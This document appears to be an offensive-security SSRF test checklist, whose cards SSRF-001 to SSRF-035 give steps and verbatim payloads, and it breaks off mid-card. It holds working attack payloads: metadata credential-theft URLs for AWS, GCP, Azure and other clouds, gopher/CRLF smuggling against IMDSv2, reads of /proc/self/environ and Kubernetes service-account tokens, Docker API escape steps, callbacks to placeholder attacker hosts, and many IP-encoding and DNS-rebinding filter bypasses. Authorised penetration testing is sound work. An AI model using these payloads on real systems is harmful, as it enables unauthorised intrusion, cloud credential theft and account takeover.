# SSRF — Checklist

Expert per-attack **test-case matrix** for SSRF — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*92 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## SSRF-001 — Enumerate URL-accepting parameters
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Query/body/JSON params, GraphQL args, Swagger, JS files

**Test Steps:** 1. Proxy all traffic; spider auth + unauth areas.<br>2. Grep history/JS for URL-ish params: url,uri,link,src,dest,redirect,next,data,reference,site,html,path,continue,window,to,out,view,dir,show,file,document,feed,host,port,callback,return,page,load,template,domain,fetch,image_url,source,target,webhook.<br>3. Extract endpoints from JS + Swagger + GraphQL introspection.<br>4. Record every server-side-fetch sink.

**Expected Result:** Catalogue of every parameter/endpoint that could cause an outbound server request.

**Payload Example:**

```
arjun -u https://$TARGET/api/preview -m GET
katana -u https://$TARGET -jc -kf all | grep -Ei 'url=|link=|src=|fetch='
```

**Impact:** Defines the SSRF attack surface; a missed sink = a missed vuln.

**Tools:** Burp Suite Pro, Arjun, ParamSpider, katana, LinkFinder, gau, InQL

**References:** CWE-918; OWASP WSTG-INPV-19; PortSwigger SSRF; PayloadsAllTheThings/SSRF

---

## SSRF-002 — Identify URL-influencing HTTP headers
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Headers forwarded to backends / reverse proxies

**Test Steps:** 1. Review requests where headers drive routing/fetching.<br>2. Flag Host,X-Forwarded-Host,X-Forwarded-For,X-Original-URL,X-Rewrite-URL,Referer,Origin,Forwarded,True-Client-IP,CF-Connecting-IP,X-Custom-IP-Authorization.<br>3. Note features fetching by Referer or Host.

**Expected Result:** List of headers that alter server-side request behaviour.

**Payload Example:**

```
GET /api/resource HTTP/1.1
Host: $TARGET
X-Forwarded-Host: $COLLAB
Referer: https://$COLLAB/
```

**Impact:** Header SSRF often bypasses body/param validation entirely.

**Tools:** Burp Suite Pro, Param Miner, mitmproxy

**References:** CWE-918; PortSwigger Host header attacks; Orange Tsai 'A New Era of SSRF'

---

## SSRF-003 — Fingerprint fetch client &amp; cloud provider
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** OOB callback UA/source-IP; error banners

**Test Steps:** 1. Fire OOB callback; read the User-Agent (python-requests/Go/Java/curl/PhantomJS/HeadlessChrome/wkhtmltopdf).<br>2. Map UA -&gt; library to choose parser/protocol payloads.<br>3. From source IP/reverse-DNS/banners infer AWS/GCP/Azure/DO to aim metadata attacks.

**Expected Result:** Known fetch library + hosting provider for targeted payloads.

**Payload Example:**

```
GET /preview?url=https://$COLLAB/fp HTTP/1.1  # inspect UA + src IP
```

**Impact:** Directs all downstream payload selection; raises success on hardened apps.

**Tools:** Burp Collaborator, interactsh, whatweb

**References:** CWE-918; Assetnote SSRF; Orange Tsai (BlackHat)

---

## SSRF-004 — Discover hidden SSRF-capable endpoints
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** JS bundles, GraphQL, mobile APK/IPA, hidden paths

**Test Steps:** 1. LinkFinder/katana over JS for endpoints.<br>2. GraphQL introspection; parse Swagger/OpenAPI for URL-typed params.<br>3. jadx/apktool over mobile apps for API URLs.<br>4. Fuzz import/export/webhook/proxy/fetch/preview paths.

**Expected Result:** Discovery of undocumented endpoints that make server-side requests.

**Payload Example:**

```
ffuf -u https://$TARGET/api/FUZZ -w ssrf-endpoints.txt
# /api/fetch /api/proxy /api/preview /api/import /internal/
```

**Impact:** Hidden internal-only fetchers are often the least-defended SSRF sinks.

**Tools:** LinkFinder, katana, ffuf, InQL, jadx, apktool

**References:** CWE-918; PayloadsAllTheThings/SSRF

---

## SSRF-005 — Map file-upload &amp; document-processing sinks
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Avatar/doc/import uploads; SVG/XML/XLSX/DOCX/PDF/HTML processors

**Test Steps:** 1. List upload endpoints + accepted types.<br>2. Determine which are parsed/converted server-side (thumbnailer, LibreOffice, wkhtmltopdf, ImageMagick, headless Chrome).<br>3. Flag HTML/MD-&gt;PDF/PNG renderers (prime blind-SSRF sinks).

**Expected Result:** Map of upload/conversion features that dereference external URLs/entities.

**Payload Example:**

```
Upload probe.svg with <image href="https://$COLLAB/svg"/> and watch for callback.
```

**Impact:** File-processing SSRF reaches metadata/internal with no visible URL param.

**Tools:** Burp, ExifTool, oxml/zip tooling

**References:** CWE-918; PayloadsAllTheThings/SSRF; PortSwigger XXE; ImageTragick

---

## SSRF-006 — Confirm SSRF via out-of-band callback
**Test Category:** Basic SSRF (In-band) · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** url= style param in preview/import/fetch/proxy features

**Test Steps:** 1. Put a unique OOB domain in the URL value.<br>2. Submit; watch Collaborator for DNS+HTTP.<br>3. Record callback source IP + UA.<br>4. Only then pivot to internal targets.

**Expected Result:** Server issues DNS + HTTP request to your OOB host.

**Payload Example:**

```
?url=https://$COLLAB/ssrf-confirm
```

**Impact:** Proves the server-side fetch exists; source IP may expose internal infra.

**Tools:** Burp Collaborator, interactsh, webhook.site

**References:** CWE-918; PortSwigger: Basic SSRF against local server; WSTG-INPV-19

---

## SSRF-007 — Reach localhost / loopback services
**Test Category:** Basic SSRF (In-band) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** URL param that returns/renders fetched content

**Test Steps:** 1. Request http://127.0.0.1/ and http://localhost/.<br>2. Sweep common local ports.<br>3. Try [::1], 0.0.0.0, 0.<br>4. Diff body/size/status to fingerprint listeners.

**Expected Result:** Response reveals loopback-bound service content (admin UI, actuator, internal API).

**Payload Example:**

```
?url=http://127.0.0.1/
?url=http://127.0.0.1:8080/
?url=http://[::1]/
```

**Impact:** Loopback services skip auth assuming isolation; SSRF exposes them.

**Tools:** Burp, curl, ffuf

**References:** CWE-918; PortSwigger: SSRF against the server itself; HackTricks SSRF

---

## SSRF-008 — Enumerate internal network hosts
**Test Category:** Basic SSRF (In-band) · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Confirmed SSRF with response/timing oracle

**Test Steps:** 1. Probe RFC1918 gateways 10.0.0.1 / 172.16-31.0.1 / 192.168.0-1.1.<br>2. Intruder-fuzz last octet; sort by status/length/time.<br>3. Record live hosts.

**Expected Result:** Distinct responses for live vs dead hosts reveal internal topology.

**Payload Example:**

```
?url=http://192.168.0.§1-255§/
```

**Impact:** Internal network map — the pivot list for downstream attacks.

**Tools:** Burp Intruder, SSRFmap

**References:** CWE-918; PortSwigger: SSRF against other back-end systems

---

## SSRF-009 — Port-scan internal hosts via SSRF
**Test Category:** Basic SSRF (In-band) · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Confirmed SSRF; per-host port probing

**Test Steps:** 1. Pick a live internal host.<br>2. Fuzz ports 21,22,25,80,443,2375,3306,5432,6379,8080,8443,9200,11211,27017.<br>3. Compare time/status/error: open=fast, closed=reset, filtered=timeout.

**Expected Result:** Open ports identified from response timing/error differences.

**Payload Example:**

```
?url=http://$INT_IP:§PORT§/
```

**Impact:** Service inventory per host; targets gopher/DB/RCE follow-ups.

**Tools:** Burp Intruder, SSRFmap

**References:** CWE-918; PayloadsAllTheThings/SSRF

---

## SSRF-010 — SSRF via server-side redirect following
**Test Category:** Basic SSRF (In-band) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Fetchers that validate initial URL but follow 3xx

**Test Steps:** 1. Host an attacker endpoint returning 302 to an internal target.<br>2. Supply it to the SSRF param.<br>3. Confirm app follows redirect to internal content.<br>4. Test 301/302/303/307/308 + protocol-switch on redirect.

**Expected Result:** App follows redirect to blocked/internal destination, defeating first-URL allowlist.

**Payload Example:**

```
?url=https://$ATTACKER/r  ->  302 Location: http://169.254.169.254/latest/meta-data/
```

**Impact:** Bypasses allowlist filters that only inspect the supplied URL.

**Tools:** Python http.server, Burp, ngrok

**References:** CWE-918; PortSwigger: SSRF filter bypass via open redirection

---

## SSRF-011 — Detect blind SSRF (OOB, no content)
**Test Category:** Blind SSRF · **Severity:** Medium · **CVSS:** 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Where to Test / Injection Point:** Webhooks, async import, tracking pixels, PDF/email jobs

**Test Steps:** 1. Inject OOB URL into a param whose content is never reflected.<br>2. Trigger; watch for DNS-only vs DNS+HTTP.<br>3. Note timing (sync vs queue) + source IP.

**Expected Result:** OOB service records lookup/request though body shows nothing.

**Payload Example:**

```
?webhook_url=https://$COLLAB/blind
```

**Impact:** Confirms exploitable fetch with no output — basis for cloud/internal pivots.

**Tools:** Burp Collaborator, interactsh, dnslog

**References:** CWE-918; PortSwigger: Blind SSRF with OOB detection

---

## SSRF-012 — Blind SSRF via webhook/callback config
**Test Category:** Blind SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Webhook/IPN/CI/OAuth callback URL configuration

**Test Steps:** 1. Set callback to Collaborator; trigger event; confirm OOB.<br>2. Repoint to 127.0.0.1 / 169.254.169.254 / internal.<br>3. Use timing/error diffs; watch async retries.

**Expected Result:** Server-issued callback reaches OOB, then internal/metadata.

**Payload Example:**

```
webhook_url=https://$COLLAB/wh  ->  http://169.254.169.254/latest/meta-data/
```

**Impact:** Blind SSRF to metadata from a legitimate feature.

**Tools:** Burp Collaborator, interactsh

**References:** CWE-918; PayloadsAllTheThings/SSRF; HackerOne webhook reports

---

## SSRF-013 — Blind SSRF — time-based internal port detection
**Test Category:** Blind SSRF · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Blind SSRF with measurable latency

**Test Steps:** 1. Baseline open vs closed vs black-hole latency.<br>2. Intruder-scan using response time as oracle.<br>3. Aggregate to map live services.

**Expected Result:** Statistically separable timing bands map internal ports blindly.

**Payload Example:**

```
?url=http://$INT_IP:§PORT§/  (measure TTFB)
```

**Impact:** Internal discovery with zero reflection.

**Tools:** Burp/Turbo Intruder, custom timing scripts

**References:** CWE-918; PortSwigger Blind SSRF; Assetnote

---

## SSRF-014 — Blind SSRF — error/boolean differential
**Test Category:** Blind SSRF · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Blind SSRF surfacing different errors per target state

**Test Steps:** 1. Request valid vs invalid internal target; capture error/status/size.<br>2. Build oracle: refused vs timed-out vs no-route vs not-resolved.<br>3. Iterate IPs/ports.

**Expected Result:** Error/status/length differences act as a reachability oracle.

**Payload Example:**

```
?url=http://$INT_IP:22/ (refused) vs :9999/ (timeout)
```

**Impact:** Blind internal mapping via error inference.

**Tools:** Burp Comparer, custom scripts

**References:** CWE-918; PayloadsAllTheThings/SSRF; WSTG-INPV-19

---

## SSRF-015 — AWS IMDSv1 credential theft
**Test Category:** Cloud Metadata SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF on AWS EC2 app (IMDSv1 enabled)

**Test Steps:** 1. GET http://169.254.169.254/latest/meta-data/.<br>2. /iam/security-credentials/ -&gt; role name.<br>3. /iam/security-credentials/&lt;ROLE&gt; -&gt; AccessKeyId/Secret/Token.<br>4. /latest/user-data + /dynamic/instance-identity/document (account/region).<br>5. Load creds into aws-cli; prove live with sts get-caller-identity, then STOP.

**Expected Result:** IMDSv1 returns IAM creds + identity with no auth.

**Payload Example:**

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** AWS account foothold: assume role, pivot to S3/EC2/Lambda — often account takeover (cf. Capital One 2019).

**Tools:** Burp, curl, aws-cli, Pacu, SSRFmap

**References:** CWE-918; Capital One 2019 post-mortem; PortSwigger SSRF; AWS IMDS docs

---

## SSRF-016 — AWS ECS/Fargate/Lambda/EKS container credential theft
**Test Category:** Cloud Metadata SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF on AWS where EC2 IMDS (169.254.169.254) returns nothing (container/serverless)

**Test Steps:** 1. EC2 IMDS dead -&gt; likely ECS/Fargate/Lambda/EKS.<br>2. ECS/Fargate: GET http://169.254.170.2/v2/credentials/ then the GUID (or http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI).<br>3. Lambda: file:///proc/self/environ for AWS_ACCESS_KEY_ID/_SECRET_ACCESS_KEY/_SESSION_TOKEN.<br>4. EKS/IRSA: file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token.<br>5. Prove live with aws sts get-caller-identity, then STOP.

**Expected Result:** Container/serverless role creds returned from 169.254.170.2 or environ/token file.

**Payload Example:**

```
?url=http://169.254.170.2/v2/credentials/
?url=file:///proc/self/environ
```

**Impact:** The modern, most-missed AWS cred-theft path when EC2 IMDS is disabled — full account foothold.

**Tools:** Burp, curl, aws-cli, SSRFmap

**References:** CWE-918; AWS ECS/Lambda docs; SSRF_ARSENAL §M

---

## SSRF-017 — AWS IMDSv2 bypass via gopher PUT / CRLF
**Test Category:** Cloud Metadata SSRF · **Severity:** Critical · **CVSS:** 9.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** AWS SSRF where IMDSv1 returns 401/403

**Test Steps:** 1. Confirm IMDSv1 blocked.<br>2. IMDSv2 needs PUT /latest/api/token (TTL header) then GET with token header.<br>3. If GET-only, smuggle PUT via gopher:// or CRLF-inject the token header.<br>4. Read IAM creds with token.

**Expected Result:** Token obtained via smuggling despite IMDSv2; creds read.

**Payload Example:**

```
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP%2F1.1%0d%0aHost:169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:21600%0d%0a%0d%0a
```

**Impact:** Defeats the primary IMDSv2 mitigation; restores Critical cred theft.

**Tools:** Burp, gopherus, SSRFmap

**References:** CWE-918; AWS IMDSv2 docs; PayloadsAllTheThings; Orange Tsai gopher

---

## SSRF-018 — GCP metadata service token theft
**Test Category:** Cloud Metadata SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF on GCP Compute/GKE (needs Metadata-Flavor: Google)

**Test Steps:** 1. GET http://metadata.google.internal/computeMetadata/v1/.<br>2. If 403, inject Metadata-Flavor:Google via gopher/CRLF.<br>3. /instance/service-accounts/default/token -&gt; OAuth token.<br>4. One-shot dump everything: /computeMetadata/v1/?recursive=true&amp;alt=json.<br>5. Grab /instance/attributes/kube-env, /project/project-id.

**Expected Result:** SA OAuth token + full project/instance metadata returned (recursive=true dumps all in one request).

**Payload Example:**

```
gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP%2F1.1%0d%0aHost:metadata.google.internal%0d%0aMetadata-Flavor:Google%0d%0a%0d%0a
(one-shot) /computeMetadata/v1/?recursive=true&alt=json
```

**Impact:** GCP project compromise; GKE escalation.

**Tools:** Burp, gopherus, gcloud CLI

**References:** CWE-918; GCP metadata docs; PayloadsAllTheThings; HackTricks GCP

---

## SSRF-019 — Azure IMDS managed-identity token theft
**Test Category:** Cloud Metadata SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF on Azure VM/AKS (needs Metadata: true)

**Test Steps:** 1. GET /metadata/instance?api-version=2021-02-01 with Metadata:true (gopher/CRLF if needed).<br>2. /metadata/identity/oauth2/token?...&amp;resource=https://management.azure.com/ -&gt; token.<br>3. Use token against ARM.

**Expected Result:** Managed-identity OAuth token for ARM returned.

**Payload Example:**

```
?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  (Metadata: true)
```

**Impact:** Azure subscription access; often broad Contributor rights.

**Tools:** Burp, gopherus, az CLI

**References:** CWE-918; Azure IMDS docs; PayloadsAllTheThings

---

## SSRF-020 — DigitalOcean metadata theft
**Test Category:** Cloud Metadata SSRF · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** SSRF on DigitalOcean droplet

**Test Steps:** 1. GET http://169.254.169.254/metadata/v1/.<br>2. /metadata/v1/user-data (init scripts/secrets).<br>3. id/hostname/region/interfaces/private ipv4.

**Expected Result:** Droplet metadata incl. user-data scripts with secrets.

**Payload Example:**

```
?url=http://169.254.169.254/metadata/v1/user-data
```

**Impact:** Instance secrets disclosed; no special headers needed (easy exploit).

**Tools:** Burp, curl, SSRFmap

**References:** CWE-918; DigitalOcean docs; PayloadsAllTheThings

---

## SSRF-021 — Alibaba / Oracle / IBM / OpenStack metadata
**Test Category:** Cloud Metadata SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF where provider is Alibaba/OCI/IBM/OpenStack

**Test Steps:** 1. Alibaba: http://100.100.100.200/latest/meta-data/.<br>2. Oracle OCI: http://169.254.169.254/opc/v2/instance/ (Authorization: Bearer Oracle).<br>3. OpenStack: /openstack/latest/meta_data.json.<br>4. IBM: http://169.254.169.254/metadata/v1/.

**Expected Result:** Provider metadata / user-data (secrets/tokens) returned.

**Payload Example:**

```
?url=http://100.100.100.200/latest/meta-data/
?url=http://169.254.169.254/opc/v2/instance/
```

**Impact:** Instance secrets disclosed across non-AWS clouds — always test every provider.

**Tools:** Burp, SSRFmap, provider CLIs

**References:** CWE-918; PayloadsAllTheThings; provider metadata docs

---

## SSRF-022 — SSRF to Docker API
**Test Category:** Cloud Metadata SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF inside container network with exposed Docker socket/TCP

**Test Steps:** 1. http://172.17.0.1:2375/version and /containers/json.<br>2. If reachable, list/inspect containers.<br>3. Create a container mounting host / to escape (where write is possible via gopher POST).

**Expected Result:** Unauthenticated Docker API responds with container/host info.

**Payload Example:**

```
?url=http://172.17.0.1:2375/containers/json
```

**Impact:** Container escape / host RCE via exposed Docker API.

**Tools:** Burp, gopherus, SSRFmap

**References:** CWE-918; HackTricks Docker; PayloadsAllTheThings

---

## SSRF-023 — SSRF to Kubernetes API / kubelet / etcd
**Test Category:** Cloud Metadata SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSRF inside a K8s cluster

**Test Steps:** 1. K8s API: https://kubernetes.default.svc/api/v1/namespaces (with SA token).<br>2. Kubelet: https://127.0.0.1:10250/pods (and /run on old builds).<br>3. etcd: http://127.0.0.1:2379/v2/keys/?recursive=true.<br>4. Read SA token: file:///var/run/secrets/kubernetes.io/serviceaccount/token.

**Expected Result:** Cluster control endpoints or SA tokens reachable.

**Payload Example:**

```
?url=https://127.0.0.1:10250/pods
?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
```

**Impact:** Cluster takeover; kubelet exec = node RCE.

**Tools:** Burp, kubectl, SSRFmap

**References:** CWE-918; HackTricks Kubernetes; PayloadsAllTheThings

---

## SSRF-024 — Localhost alias bypass
**Test Category:** Bypass — IP Obfuscation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Filters blocking 'localhost'/'127.0.0.1' strings

**Test Steps:** 1. Try 127.1, 127.0.1, 0, 0.0.0.0, [::1], [::], [::ffff:127.0.0.1], 127.127.127.127.<br>2. Trailing dot 127.0.0.1.; brackets [127.0.0.1].<br>3. Record which reach loopback.

**Expected Result:** An alias bypasses the string blocklist and reaches 127.0.0.1.

**Payload Example:**

```
?url=http://127.1/
?url=http://0/
?url=http://[::1]/
```

**Impact:** Neutralises naive blocklists; restores loopback/metadata access.

**Tools:** Burp Intruder, SSRFmap

**References:** CWE-918; PortSwigger blacklist filters; PayloadsAllTheThings

---

## SSRF-025 — Decimal IP encoding bypass
**Test Category:** Bypass — IP Obfuscation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** String/regex IP blocklists

**Test Steps:** 1. 127.0.0.1 = 2130706433; 169.254.169.254 = 2852039166; 10.0.0.1 = 167772161.<br>2. Try http://&lt;decimal&gt;/.<br>3. Compute for any internal target with int(IPv4Address).

**Expected Result:** Decimal integer host bypasses dotted-decimal filters.

**Payload Example:**

```
?url=http://2130706433/
?url=http://2852039166/latest/meta-data/
```

**Impact:** Very effective bypass — many parsers accept integer IPs.

**Tools:** Python ipaddress, Burp, SSRFmap

**References:** CWE-918; PayloadsAllTheThings; PortSwigger

---

## SSRF-026 — Hexadecimal IP encoding bypass
**Test Category:** Bypass — IP Obfuscation · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** String/regex IP blocklists

**Test Steps:** 1. Full hex http://0x7f000001; dotted http://0x7f.0x0.0x0.0x1.<br>2. Metadata http://0xa9fea9fe.<br>3. Uppercase/padded variants.

**Expected Result:** Hex host bypasses decimal-string filters.

**Payload Example:**

```
?url=http://0x7f000001/
?url=http://0xa9fea9fe/latest/meta-data/
```

**Impact:** Bypasses regex expecting dotted decimal.

**Tools:** Burp, CyberChef

**References:** CWE-918; PayloadsAllTheThings

---

## SSRF-027 — Octal IP encoding bypass
**Test Category:** Bypass — IP Obfuscation · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** String/regex IP blocklists

**Test Steps:** 1. http://0177.0.0.01; full http://017700000001; padded http://0177.0000.0000.0001.<br>2. Mixed 0177.0.0.1.<br>3. Beware 010.0.0.1 = 8.0.0.1.

**Expected Result:** Octal host bypasses decimal filters.

**Payload Example:**

```
?url=http://0177.0.0.01/
?url=http://017700000001/
```

**Impact:** Bypasses naive IP validators.

**Tools:** Burp, CyberChef

**References:** CWE-918; PayloadsAllTheThings

---

## SSRF-028 — IPv6 representation bypass
**Test Category:** Bypass — IP Obfuscation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** IPv4-only blocklists

**Test Steps:** 1. [::1], [::], [0:0:0:0:0:ffff:127.0.0.1].<br>2. Mapped metadata [::ffff:a9fe:a9fe].<br>3. Zone id [::1%25eth0].

**Expected Result:** IPv6/mapped form bypasses IPv4-only filters.

**Payload Example:**

```
?url=http://[::1]/
?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/
```

**Impact:** Commonly overlooked in code + WAF rules.

**Tools:** Burp, curl -6

**References:** CWE-918; PayloadsAllTheThings; PortSwigger

---

## SSRF-029 — Rare URL/IP format bypass
**Test Category:** Bypass — IP Obfuscation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Lenient parsers

**Test Steps:** 1. Shorthand 127.1; single 0; trailing dot 127.0.0.1.<br>2. Zero-padded 127.000.000.001; brackets [127.0.0.1].<br>3. Fullwidth 127。0。0。1; nip.io suffix 127.0.0.1.nip.io.

**Expected Result:** Unusual valid form bypasses validation.

**Payload Example:**

```
?url=http://127.1/
?url=http://127.0.0.1.nip.io/
```

**Impact:** Exploits parser leniency filters don't anticipate.

**Tools:** Burp Intruder, bypass wordlists

**References:** CWE-918; PayloadsAllTheThings; URL parsing papers

---

## SSRF-030 — Attacker domain A-record to internal IP
**Test Category:** Bypass — DNS · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Hostname allowlist that resolves supplied domain

**Test Steps:** 1. Point a domain you control at 127.0.0.1 / metadata IP.<br>2. Submit; validator sees external domain, resolution hits internal.<br>3. Confirm request lands internally.

**Expected Result:** App accepts external-looking domain but connects to internal IP.

**Payload Example:**

```
?url=http://myhost.$ATTACKER/  (A -> 127.0.0.1)
```

**Impact:** Bypasses hostname allowlists trusting the string.

**Tools:** Own DNS, Burp

**References:** CWE-918; PortSwigger SSRF filter bypass; PayloadsAllTheThings DNS

---

## SSRF-031 — Wildcard-DNS service bypass (nip.io/sslip.io)
**Test Category:** Bypass — DNS · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** Domain filters not blocking wildcard DNS services

**Test Steps:** 1. 127.0.0.1.nip.io -&gt; 127.0.0.1; 127-0-0-1.sslip.io.<br>2. Internal 169.254.169.254.nip.io.<br>3. Subdomain-prefix anything.127.0.0.1.nip.io.

**Expected Result:** Wildcard DNS resolves to internal IP, bypassing domain blocklists.

**Payload Example:**

```
?url=http://169.254.169.254.nip.io/latest/meta-data/
```

**Impact:** One-liner bypass of hostname allow/deny lists.

**Tools:** nip.io, sslip.io, dig

**References:** CWE-918; PayloadsAllTheThings DNS

---

## SSRF-032 — DNS rebinding (TOCTOU) bypass
**Test Category:** Bypass — DNS · **Severity:** Critical · **CVSS:** 9.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Validators that resolve twice (check then fetch)

**Test Steps:** 1. Use rbndr.us/singularity alternating safe IP + internal target, TTL 0.<br>2. Submit rebinding host.<br>3. First resolve (check)=safe, second (fetch)=internal.<br>4. Retry to win the cache race.

**Expected Result:** Validation passes on benign IP; fetch lands internal.

**Payload Example:**

```
?url=http://7f000001.c0a80001.rbndr.us/
```

**Impact:** Defeats validate-then-fetch guards not pinning resolved IP.

**Tools:** rbndr.us, Singularity of Origin, whonow

**References:** CWE-918; NCC/Ormandy DNS rebinding; PayloadsAllTheThings

---

## SSRF-033 — CNAME to internal hostname bypass
**Test Category:** Bypass — DNS · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Hostname-based (not IP-based) filters

**Test Steps:** 1. Register ssrf.$ATTACKER; set CNAME metadata.google.internal (or A 169.254.169.254).<br>2. Submit; app resolves your domain -&gt; internal.<br>3. Works if only the initial hostname is checked.

**Expected Result:** App connects to internal target via CNAME/A of attacker domain.

**Payload Example:**

```
?url=http://ssrf.$ATTACKER/computeMetadata/v1/  (CNAME -> metadata.google.internal)
```

**Impact:** Powerful against hostname allowlists.

**Tools:** DNS panel, dig

**References:** CWE-918; PayloadsAllTheThings DNS

---

## SSRF-034 — URL single/double-encoding bypass
**Test Category:** Bypass — Encoding · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** String-matching WAFs/filters

**Test Steps:** 1. Single-encode dots/host: http://127%2e0%2e0%2e1/.<br>2. Full percent host: %31%32%37%2e%30%2e%30%2e%31.<br>3. Double-encode for double-decode stacks: %252e.<br>4. Fullwidth slash %ef%bc%8f.

**Expected Result:** Encoded payload passes filter, decoded by client to blocked target.

**Payload Example:**

```
?url=http://127%2e0%2e0%2e1/
?url=http://%31%32%37%2e%30%2e%30%2e%31/
```

**Impact:** Bypasses signature/regex filters; double-encoding beats double-decoders.

**Tools:** Burp Decoder/Intruder, CyberChef

**References:** CWE-918; PayloadsAllTheThings; PortSwigger

---

## SSRF-035 — Unicode/punycode/homoglyph host bypass
**Test Category:** Bypass — Encoding · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** ASCII filters where server normalizes later

**Test Steps:** 1. Fullwidth ASCII host; homoglyphs (Greek/Cyrillic).<br>2. Ideographic dot U+3002 127。0。0。1; division slash U+2215.<br>3. Enclosed alphanumerics; punycode xn--.<br>4. Confirm NFKC folds to ASCII post-filter.

**Expected Result:** Post-validation normalization turns benign host into blocked target.

**Payload Example:**

```
?url=http://127。0。0。1/
?url=http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
```

